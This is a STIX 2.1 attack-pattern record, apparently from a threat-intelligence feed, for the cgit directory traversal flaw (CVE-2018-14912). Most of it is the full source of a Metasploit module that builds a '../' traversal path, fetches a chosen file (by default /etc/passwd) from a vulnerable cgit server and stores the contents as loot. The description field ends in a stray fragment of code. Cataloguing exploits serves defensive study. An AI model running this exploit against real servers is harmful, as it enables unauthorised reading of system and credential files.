{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--98ffbdb6-67b2-4ad2-9cff-219892e23543",
    "created": "2024-08-14T16:29:00.817311Z",
    "modified": "2024-08-14T16:29:00.817315Z",
    "name": "cgit Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability which exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the configuration flag enable-http-clone is set to 1 (default).  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cgit_traversal.rb",
            "external_id": "cgit_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.chromium.org/p/project-zero/issues/detail?id=1627"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'cgit Directory Traversal',\n      'Description' => %q{\n        This module exploits a directory traversal vulnerability which\n        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the\n        configuration flag enable-http-clone is set to 1 (default).\n      },\n      'References'  =>\n        [\n          ['CVE', '2018-14912'],\n          ['URL', 'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627'],\n          ['EDB', '45148']\n        ],\n      'Author'      =>\n        [\n          'Google Project Zero', # Vulnerability discovery\n          'Dhiraj Mishra' # Metasploit module\n        ],\n      'DisclosureDate' => '2018-08-03',\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('FILEPATH', [true, \"The path to the file to read\", '/etc/passwd']),\n        OptString.new('TARGETURI', [true, \"The base URI path of the cgit install\", '/cgit/']),\n        OptString.new('REPO', [true, \"Git repository on the remote server\", '']),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])\n      ])\n  end\n\n  def run_host(ip)\n    filename = datastore['FILEPATH']\n    traversal = \"../\" * datastore['DEPTH'] << filename\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),\n      'vars_get' => {'path' => traversal}\n    })\n\n    unless res && res.code == 200\n      print_error('Nothing was downloaded')\n      return\n    end\n\n    vprint_good(\"#{peer} - \\n#{res.body}\")\n    path = store_loot(\n      'cgit.traversal',\n      'text/plain',\n      ip,\n      res.body,\n      filename\n    )\n    print_good(\"File saved in: #{path}\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-08-03"
}